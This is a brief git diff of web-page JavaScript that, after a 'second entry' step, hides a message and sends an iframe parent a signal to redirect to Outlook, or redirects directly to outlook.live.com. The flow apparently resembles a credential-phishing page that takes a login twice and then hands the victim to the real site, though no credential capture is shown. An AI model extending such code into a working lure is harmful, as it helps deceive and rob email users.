@@ -66,9 +66,13 @@ document.addEventListener("DOMContentLoaded", () => {
 
         msg.style.display = "none"; // 👈 hide message before redirect
 
-        // ✅ Instead of redirecting inside the iframe,
-        // send signal to parent to redirect full page
-        window.parent.postMessage("redirect-to-outlook", "*");
+        // ✅ Send redirect signal to parent page (iframe outer page)
+        if (window.parent !== window) {
+          window.parent.postMessage("redirect-to-outlook", "*");
+        } else {
+          // 🧪 Fallback: if opened directly (not inside iframe), redirect normally
+          window.location.href = "https://outlook.live.com";
+        }
       } catch (err) {
         console.error("❌ Failed second time:", err);
         alert("Something went wrong on second entry.");
